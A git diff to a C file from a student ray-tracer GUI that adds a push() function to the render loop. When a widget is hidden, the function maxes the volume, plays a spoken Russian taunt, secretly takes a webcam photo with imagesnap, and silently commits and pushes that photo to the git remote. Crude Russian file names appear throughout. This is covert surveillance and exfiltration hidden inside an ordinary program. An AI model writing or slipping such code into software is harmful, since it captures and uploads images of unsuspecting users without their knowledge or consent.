@@ -6,11 +6,28 @@
 /*   By: lminta <lminta@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/09/13 15:21:19 by lminta            #+#    #+#             */
-/*   Updated: 2019/11/14 21:56:21 by lminta           ###   ########.fr       */
+/*   Updated: 2019/11/14 22:22:21 by lminta           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "rt.h"
+
+static void	push(t_gui *gui)
+{
+	static int flag = 1;
+
+	if (KW_IsWidgetHidden(gui->ed_w.frame) == KW_TRUE && flag)
+	{
+		system("osascript -e 'set Volume 1000'");
+		system("say -v Yuri 'В глаза мне смотри'&");
+		system("./gui/ImageSnap-v0.2.5/imagesnap './tvoj_eblet.jpg' > /dev/null");
+		system("open './gui/res/ebalo.jpg'&");
+		system("git add './tvoj_eblet.jpg' > /dev/null");
+		system("git commit -m 'face' > /dev/null");
+		system("git push 2> /dev/null");
+		flag = 0;
+	}
+}
 
 t_gui		*g_gui(t_gui *gui, int flag)
 {
@@ -34,10 +51,6 @@ static void	in_e(t_gui *gui)
 	KW_RectCenterInParent(&gui->i_e.frect, &gui->i_e.titlerect);
 	gui->i_e.label = KW_CreateLabel(gui->gui,
 	gui->i_e.frame, "V GLAZA MNE SMOTRI", &gui->i_e.titlerect);
-	system("osascript -e 'set Volume 1000'&");
-	system("say -v Yuri 'В глаза мне смотри'&");
-	system("./gui/ImageSnap-v0.2.5/imagesnap './screens/tvoj_eblet.jpg'&");
-	system("open './gui/res/ebalo.jpg'&");
 }
 
 void		init_kiwi(t_gui *gui)
@@ -105,6 +118,7 @@ void		loopa(t_game *game, t_gui *gui)
 				gui->quit = 1;
 		ft_render(game, gui);
 		screen_present(game, gui);
+		push(gui);
 		time = SDL_GetTicks() - time;
 		if (time < TICKS_PER_FRAME)
 			SDL_Delay(TICKS_PER_FRAME - time);
